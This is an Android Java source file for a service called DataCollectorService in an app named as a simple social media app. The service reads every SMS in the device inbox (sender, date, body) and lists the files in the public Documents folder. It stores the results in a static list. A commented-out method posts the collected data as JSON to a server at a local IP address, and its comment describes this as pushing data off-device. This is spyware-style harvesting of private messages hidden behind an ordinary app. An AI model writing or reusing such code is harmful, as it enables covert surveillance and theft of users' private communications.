package com.example.simplesocialmediaapp;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.util.ArrayList;

/**
 * A background service that collects SMS and external storage file info.
 * You must declare it in AndroidManifest.xml and start it from an Activity.
 */
public class DataCollectorService extends Service {

    private static final String TAG = "DataCollectorService";

    // The collected data is stored here. Other parts of the app can read it statically.
    public static ArrayList<String> collectedData = new ArrayList<>();

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "DataCollectorService created.");
    }

    /**
     * Called when the service is started (e.g., via startService()).
     * We perform the data collection in a background thread to avoid blocking the UI.
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "DataCollectorService started.");

        new Thread(new Runnable() {
            @Override
            public void run() {
                collectSMS();
                collectDocumentsOrImages();

                // Optionally send data to your server or PC here:
                // sendDataToServer(collectedData);

                // Stop the service after finishing data collection
                stopSelf();
            }
        }).start();

        // If the system kills the service, do not recreate it automatically.
        return START_NOT_STICKY;
    }

    /**
     * Collect SMS messages from the device’s inbox.
     * Requires READ_SMS permission. On newer Android versions,
     * your app must be default SMS handler or have special allowances.
     */
    private void collectSMS() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "READ_SMS permission not granted. Skipping SMS collection.");
            return;
        }
        try {
            Uri smsUri = Uri.parse("content://sms/inbox");
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(smsUri, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                    String smsData = "SMS from: " + address + "\nDate: " + date + "\n" + body;
                    collectedData.add(smsData);
                }
                cursor.close();
            } else {
                Log.e(TAG, "No SMS data found or access restricted.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading SMS: " + e.getMessage());
        }
    }

    /**
     * Collect file info from external storage.
     * This uses READ_EXTERNAL_STORAGE for documents. For Android 13+ media usage,
     * you might replace this with reading images only using READ_MEDIA_IMAGES, etc.
     */
    private void collectDocumentsOrImages() {
        // Check permission
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "READ_EXTERNAL_STORAGE permission not granted. Skipping doc collection.");
            return;
        }

        // For demonstration, we read the public Documents directory.
        // If you only want images, you might use Environment.DIRECTORY_PICTURES instead,
        // or handle the new "READ_MEDIA_IMAGES" approach.
        File documentsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);

        if (documentsDir != null && documentsDir.exists() && documentsDir.isDirectory()) {
            File[] files = documentsDir.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isFile()) {
                        String fileInfo = "Document: " + file.getName()
                                + " (" + file.length() + " bytes)";
                        collectedData.add(fileInfo);
                    }
                }
            } else {
                Log.e(TAG, "No files found in the Documents folder.");
            }
        } else {
            Log.e(TAG, "Documents directory not available or does not exist.");
        }
    }

    // Example method to send data to a server or PC via HTTP (OkHttp).
    // Uncomment and configure if you want to push data off-device.
    /*
    private void sendDataToServer(ArrayList<String> dataList) {
        // Example: OkHttp + GSON
        OkHttpClient client = new OkHttpClient();
        Gson gson = new Gson();
        String json = gson.toJson(dataList);

        RequestBody body = RequestBody.create(json, MediaType.parse("application/json; charset=utf-8"));
        Request request = new Request.Builder()
                .url("http://192.168.1.100:8080/uploadData") // Replace with your local or remote server
                .post(body)
                .build();
        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) {
                Log.e(TAG, "Server responded with error: " + response.code());
            } else {
                Log.i(TAG, "Data successfully sent to server.");
            }
        } catch (IOException e) {
            Log.e(TAG, "Error sending data: " + e.getMessage());
        }
    }
    */

    @Override
    public IBinder onBind(Intent intent) {
        // Not a bound service
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "DataCollectorService destroyed.");
    }
}
